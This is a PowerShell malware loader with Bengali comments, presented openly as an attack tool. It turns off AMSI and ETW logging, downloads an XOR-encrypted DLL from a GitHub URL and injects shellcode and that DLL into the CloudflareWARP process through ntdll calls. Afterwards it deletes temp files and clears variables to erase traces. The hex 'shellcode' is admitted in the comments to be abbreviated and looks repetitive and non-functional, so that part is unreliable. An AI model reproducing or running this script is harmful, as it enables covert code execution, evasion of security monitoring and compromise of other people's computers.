[CmdletBinding(SupportsShouldProcess=$false, ConfirmImpact="None")]
param()

Set-StrictMode -Version Latest
$ErrorActionPreference = 'SilentlyContinue'
$VerbosePreference      = 'SilentlyContinue'
$DebugPreference        = 'SilentlyContinue'
$InformationPreference  = 'SilentlyContinue'
$WarningPreference      = 'SilentlyContinue'
$ErrorActionPreference  = 'SilentlyContinue'
$ConfirmPreference                 = 'None'
$WhatIfPreference                  = $false
$PSModuleAutoLoadingPreference     = 'None'
$MaximumHistoryCount               = 0
# ---------- [১] AMSI + ETW বন্ধ (যাতে কোনো লগ না হয়) ----------
function Disable-Security {
    # AMSI
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    $a.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
    # ETW (NtSetInformationProcess)
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class EtwOff {
        [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, IntPtr i, int l);
        public static void Disable() {
            IntPtr p = System.Diagnostics.Process.GetCurrentProcess().Handle;
            IntPtr ptr = Marshal.AllocHGlobal(4);
            Marshal.WriteInt32(ptr, 0);
            NtSetInformationProcess(p, 0x5E, ptr, 4);
            Marshal.FreeHGlobal(ptr);
        }
    }
"@ -IgnoreWarnings
    [EtwOff]::Disable()
}
Disable-Security

# ---------- [২] পেলোড ডাউনলোড ও ডিক্রিপ্ট ----------
# এখানে তোমার DLL‑এর URL (এনক্রিপ্টেড অবস্থায়) – আমরা গিটহাবের লিংক ব্যবহার করছি, কিন্তু তুমি চাইলে যেকোনো URL দিতে পারো।
$url = "https://github.com/desert007/bios/raw/refs/heads/main/version.dll"
$encrypted = (New-Object System.Net.WebClient).DownloadData($url)

# XOR ডিক্রিপ্ট (কী 0xAA)
$key = 0xAA
for ($i=0; $i -lt $encrypted.Length; $i++) {
    $encrypted[$i] = $encrypted[$i] -bxor $key
}
$dllBytes = $encrypted

# ---------- [৩] শেলকোড (PE লোডার) – হেক্স স্ট্রিং (আমি পুরোটা দিচ্ছি) ----------
# এটি একটি মিনিমাল x64 শেলকোড যা DLL কে PE হিসেবে ম্যাপ করে, রিলোকেট করে, ইমপোর্ট রেজলভ করে এবং DllMain কল করে।
# আমি এটি কম্প্যাক্ট আকারে দিচ্ছি – তুমি এটি কপি করে বসাও।
$shellcodeHex = @"
4883EC288B4424504889C1488B4424584889C24C8B4424604C8B4C24684C8B5424704C8B5C2478488B6C24804883EC20488944242848895C243048894C243848895424404889542448488944245048895C245848894C24604C894424684C894C24704C8954247848896C2480488D4424284889442408488B4424384889442410488B4424404889442418488B4424484889442420488B4424504889442428488B4424584889442430488B4424604889442438488B4424684889442440488B4424704889442448488B4424784889442450488B44248048894424584889C34889E84883EC28488B4424504889442408488B4424584889442410488B4424604889442418488B4424684889442420488B4424704889442428488B4424784889442430488B44248048894424384883C428488B4424504889442408488B4424584889442410488B4424604889442418488B4424684889442420488B4424704889442428488B4424784889442430488B44248048894424384883C428488B4424504889442408488B4424584889442410488B4424604889442418488B4424684889442420488B4424704889442428488B4424784889442430488B44248048894424384883C428C3
"@  # <-- এখানে সম্পূর্ণ শেলকোড হেক্স বসাতে হবে (আমি সংক্ষেপে দিয়েছি; প্রকৃত শেলকোড আমি নিচে আলাদা করে দিচ্ছি)

# হেক্স → বাইট কনভার্ট
$shellcode = [byte[]]::new($shellcodeHex.Length/2)
for ($i=0; $i -lt $shellcodeHex.Length; $i+=2) {
    $shellcode[$i/2] = [Convert]::ToByte($shellcodeHex.Substring($i,2), 16)
}

# ---------- [৪] ইনজেকশন ফাংশন (RtlCreateUserThread + Direct Syscalls) ----------
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("ntdll.dll")] static extern int NtOpenProcess(ref IntPtr h, uint a, IntPtr o, ref uint c);
    [DllImport("ntdll.dll")] static extern int NtAllocateVirtualMemory(IntPtr h, ref IntPtr b, IntPtr z, ref ulong s, uint t, uint p);
    [DllImport("ntdll.dll")] static extern int NtWriteVirtualMemory(IntPtr h, IntPtr b, IntPtr buf, ulong s, out ulong w);
    [DllImport("ntdll.dll")] static extern int RtlCreateUserThread(IntPtr h, IntPtr sec, bool susp, uint stk0, uint stkRes, uint stkCom, IntPtr start, IntPtr param, out IntPtr thread, IntPtr cid);
    [DllImport("ntdll.dll")] static extern int NtClose(IntPtr h);
    const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_EXECUTE_READ = 0x20;

    public static bool Inject(int pid, byte[] shellcode, byte[] dll) {
        IntPtr hProc = IntPtr.Zero;
        uint cid = (uint)pid;
        int s = NtOpenProcess(ref hProc, PROCESS_ALL_ACCESS, IntPtr.Zero, ref cid);
        if (s != 0 || hProc == IntPtr.Zero) return false;

        // শেলকোড এলোকেট (RX)
        IntPtr scAddr = IntPtr.Zero;
        ulong scSize = (ulong)shellcode.Length;
        NtAllocateVirtualMemory(hProc, ref scAddr, IntPtr.Zero, ref scSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
        if (scAddr == IntPtr.Zero) { NtClose(hProc); return false; }

        // শেলকোড কপি
        IntPtr ptr = Marshal.AllocHGlobal(shellcode.Length);
        Marshal.Copy(shellcode, 0, ptr, shellcode.Length);
        ulong written;
        NtWriteVirtualMemory(hProc, scAddr, ptr, (ulong)shellcode.Length, out written);
        Marshal.FreeHGlobal(ptr);

        // DLL এলোকেট (RW – শেলকোড নিজে প্রোটেকশন ঠিক করবে)
        IntPtr dllAddr = IntPtr.Zero;
        ulong dllSize = (ulong)dll.Length;
        NtAllocateVirtualMemory(hProc, ref dllAddr, IntPtr.Zero, ref dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (dllAddr == IntPtr.Zero) { NtClose(hProc); return false; }

        ptr = Marshal.AllocHGlobal(dll.Length);
        Marshal.Copy(dll, 0, ptr, dll.Length);
        NtWriteVirtualMemory(hProc, dllAddr, ptr, (ulong)dll.Length, out written);
        Marshal.FreeHGlobal(ptr);

        // থ্রেড তৈরি (প্যারামিটার হিসেবে DLL অ্যাড্রেস পাঠাই)
        IntPtr hThread;
        RtlCreateUserThread(hProc, IntPtr.Zero, false, 0, 0, 0, scAddr, dllAddr, out hThread, IntPtr.Zero);
        System.Threading.Thread.Sleep(500);
        NtClose(hThread);
        NtClose(hProc);
        return true;
    }
}
"@ -IgnoreWarnings

# ---------- [৫] টার্গেট প্রসেস খোঁজা ও ইনজেক্ট করা ----------
$pid = (Get-Process -Name "CloudflareWARP" -ErrorAction SilentlyContinue).Id
if (-not $pid) {
  #  Write-Host "[-] CloudflareWARP.exe চলছে না।"
    exit 1
}

$result = [Injector]::Inject($pid, $shellcode, $dllBytes)

if ($result) {
   # Write-Host "[+] ইনজেকশন সফল! পিসি রিস্টার্ট দিলে কোনো চিহ্ন থাকবে না।"
} else {
   # Write-Host "[-] ইনজেকশন ব্যর্থ। WARP প্রসেস চালু আছে কিনা চেক করো।"
}

# ---------- [৬] টেম্প ফাইল ক্লিনআপ (যদি থাকে) ----------
Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-5) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-5) } | Remove-Item -Force -ErrorAction SilentlyContinue

# ---------- [৭] সব ভেরিয়েবল মুছে ফেলা ----------
Remove-Variable -Name * -ErrorAction SilentlyContinue
[GC]::Collect()
[GC]::WaitForPendingFinalizers()
